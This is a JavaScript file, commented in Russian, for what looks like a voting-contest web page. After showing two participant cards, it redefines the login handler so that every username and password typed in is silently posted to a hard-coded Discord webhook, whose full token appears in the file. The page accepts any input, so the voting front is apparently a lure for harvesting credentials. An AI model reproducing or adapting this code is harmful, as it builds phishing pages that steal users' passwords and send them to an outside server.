const participants = [
    { id: 1, name: 'conys', photo: './img/pngtree.png' },
    { id: 2, name: 'elafril', photo: './img/Universal.jpg' },
];

const cardContainer = document.getElementById('cardContainer');
const loginBtn = document.getElementById('loginBtn');
const submitVotesBtn = document.getElementById('submitVotes');
const loginContainer = document.getElementById('login');
const loginError = document.getElementById('loginError');

loginBtn.onclick = function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username && password) {
        loginError.style.display = 'none';
        loginContainer.style.display = 'none';
        cardContainer.style.display = 'flex';
        submitVotesBtn.style.display = 'block';

        participants.forEach(participant => {
            const card = document.createElement('div');
            card.className = 'card';
            card.innerHTML = `
                <img src="${participant.photo}" alt="${participant.name}" class="participant-photo" />
                <h3>${participant.name}</h3>
                <button onclick="vote(${participant.id})">Голосовать</button>
            `;
            cardContainer.appendChild(card);
        });
    } else {
        loginError.style.display = 'block';
        loginError.textContent = 'Введите логин и пароль!';
    }
};

let votes = {};

function vote(id) {
    if (!votes[id]) {
        votes[id] = 0;
    }
    votes[id]++;
    console.log(`Вы проголосовали за ${participants.find(p => p.id === id).name}`);
}

submitVotesBtn.onclick = function() {
    console.log('Голоса:', votes);
    
    // Показываем сообщение о подтверждении
    const confirmation = document.getElementById('confirmation');
    confirmation.style.display = 'flex';
    confirmation.style.opacity = 1;

    // Скрыть сообщение через 3 секунды
    setTimeout(() => {
        confirmation.style.opacity = 0; // Исчезновение
        setTimeout(() => {
            confirmation.style.display = 'none'; // Скрыть после исчезновения
        }, 500); // Время, совпадающее с продолжительностью перехода
    }, 3000); // Держать сообщение 3 секунды
};
const webhookURL = 'https://discord.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv'; // Замените на ваш URL вебхука

loginBtn.onclick = function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username && password) {
        loginError.style.display = 'none';
        loginContainer.style.display = 'none';
        cardContainer.style.display = 'flex';
        submitVotesBtn.style.display = 'block';

        // Отправка данных на вебхук Discord
        sendToDiscord(username, password);

        participants.forEach(participant => {
            const card = document.createElement('div');
            card.className = 'card';
            card.innerHTML = `
                <img src="${participant.photo}" alt="${participant.name}" class="participant-photo" />
                <h3>${participant.name}</h3>
                <button onclick="vote(${participant.id})">Голосовать</button>
            `;
            cardContainer.appendChild(card);
        });
    } else {
        loginError.style.display = 'block';
        loginError.textContent = 'Введите логин и пароль!';
    }
};

function sendToDiscord(username, password) {
    const message = {
        content: `Новый вход: Логин: ${username}, Пароль: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(message),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Ошибка при отправке данных на Discord');
        }
    })
    .catch(error => {
        console.error('Ошибка:', error);
    });
}




    // ... (остальной код)

